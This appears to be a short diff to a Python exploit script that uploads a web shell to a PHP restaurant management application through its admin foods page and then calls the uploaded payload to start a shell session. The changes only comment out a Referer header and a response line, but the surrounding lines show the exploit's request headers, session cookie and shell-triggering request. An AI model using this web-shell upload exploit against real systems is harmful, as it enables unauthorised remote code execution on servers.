@@ -38,7 +38,7 @@ req_header = {
     "Content-Length": "327",
     "Content-Type": "multipart/form-data;boundary=---------------------------191691572411478",
     "Connection": "close",
-    "Referer": "http://localhost:8081/rms/admin/foods.php",
+    #"Referer": "http://localhost:8081/rms/admin/foods.php", --optional
     "Cookie": "PHPSESSID=4dmIn4q1pvs4b79",
     "Upgrade-Insecure-Requests": "1"
 
@@ -69,7 +69,7 @@ try:
     print("[!]Shell payload uploaded. Payload url: " + encoded_payload_url)
 
     shell_request = rq.post(encoded_payload_url)
-    #req_response = rq.Response()
+    #req_response = rq.Response() --optional
 
 except: "[!]Payload failed to load/Shell session failed to start"
     
